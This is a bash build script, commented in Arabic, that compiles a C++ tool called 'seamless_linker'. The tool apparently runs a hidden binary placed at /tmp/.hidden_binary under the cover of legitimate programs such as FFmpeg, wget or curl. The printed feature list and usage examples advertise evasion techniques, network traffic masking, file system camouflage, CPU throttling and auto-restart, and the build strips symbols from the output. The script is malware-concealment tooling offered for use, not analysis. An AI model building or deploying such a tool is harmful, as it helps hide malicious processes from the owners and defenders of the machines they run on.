#!/bin/bash

# linking_builder.sh - أداة بناء نظام الدمج المتقدم

set -e

echo "=========================================="
echo "🔗 Advanced Linking System Builder"
echo "=========================================="

# التحقق من وجود الملفات المطلوبة
echo "📋 Checking required files..."

required_files=(
    "main.cpp"
    "innocent_wrapper.h"
    "innocent_wrapper.cpp"
    "seamless_integrator.h"
    "seamless_integrator.cpp"
)

for file in "${required_files[@]}"; do
    if [[ ! -f "$file" ]]; then
        echo "❌ Error: $file not found"
        exit 1
    fi
    echo "  ✅ $file"
done

# إنشاء مجلد الإخراج
mkdir -p output
cd output

echo ""
echo "🔄 Step 1: Copying source files..."

# نسخ ملفات الكود
cp ../*.cpp ./
cp ../*.h ./

echo "✅ Source files copied"

echo ""
echo "🔄 Step 2: Compiling advanced linking system..."

# بناء المشروع
g++ -o seamless_linker \
    main.cpp \
    innocent_wrapper.cpp \
    seamless_integrator.cpp \
    -pthread \
    -std=c++11 \
    -O2 \
    -s

if [[ $? -eq 0 ]]; then
    echo "✅ Compilation successful!"
    
    # معلومات الملف النهائي
    echo ""
    echo "📊 Output file info:"
    echo "   - Name: seamless_linker"
    echo "   - Size: $(ls -lh seamless_linker | awk '{print $5}')"
    echo "   - Path: $(pwd)/seamless_linker"
    
    echo ""
    echo "🎯 Usage Examples:"
    echo "   ./seamless_linker                                    # Use FFmpeg as cover"
    echo "   ./seamless_linker --innocent wget --max-cpu 50      # Use wget, limit CPU to 50%"
    echo "   ./seamless_linker --innocent curl --advanced-evasion # Use curl with advanced hiding"
    echo "   ./seamless_linker --help                            # Show all options"
    
    echo ""
    echo "🛡️  Advanced Features:"
    echo "   ✓ Multiple innocent program types (FFmpeg, wget, curl, tar, rsync)"
    echo "   ✓ Dynamic resource monitoring and throttling"
    echo "   ✓ Process health monitoring and auto-restart"
    echo "   ✓ Advanced evasion techniques"
    echo "   ✓ Network traffic masking"
    echo "   ✓ File system camouflage"
    echo "   ✓ Seamless process synchronization"
    
    echo ""
    echo "⚠️  Integration Notes:"
    echo "   - Place your hidden binary at /tmp/.hidden_binary"
    echo "   - Ensure innocent programs are installed (ffmpeg, wget, etc.)"
    echo "   - Run with appropriate permissions for process monitoring"
    
    echo ""
    echo "🚀 Ready for advanced linking operations!"
    
else
    echo "❌ Compilation failed!"
    echo "Please check the error messages above"
    exit 1
fi

echo ""
echo "=========================================="
echo "✅ Advanced Linking System built successfully!"
echo "=========================================="
